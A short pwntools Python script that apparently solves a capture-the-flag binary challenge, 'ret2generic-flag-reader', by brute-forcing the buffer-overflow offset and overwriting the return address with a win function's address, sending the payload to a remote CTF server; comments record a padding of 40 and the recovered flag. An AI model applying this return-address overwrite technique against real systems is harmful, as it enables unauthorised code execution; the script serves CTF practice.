from pwn import *
 
FILENAME = 'ret2generic-flag-reader'

## Bruteforce length ######################
'''
length = 0
for i in range(1,100):
    payload = cyclic(i)
    io = process(FILENAME)
    io.sendline(payload)
   # io.sendline('')
    print(io.recv())
    io.wait()
    exit_code = io.poll()
    #print(exit_code)
    if exit_code == -11:
        length = i
        break
    
print(length)
'''
e = ELF(FILENAME)

### Exploit Variable #######################################
for length in range(32, 100):
    #io = process(FILENAME)
    io = remote('mc.ax', 31077)
    variable = p64(e.symbols["super_generic_flag_reading_function_please_ret_to_me"])
    io.recv()
    io.send(b"A"*length+variable+b"\n")
    try:
        res = io.recv()
        print(res)
        if res != b'':
            io.interactive()
            break
        #break
    except:
        print(length)
    print("#"*80)

# Padding of 40
# flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
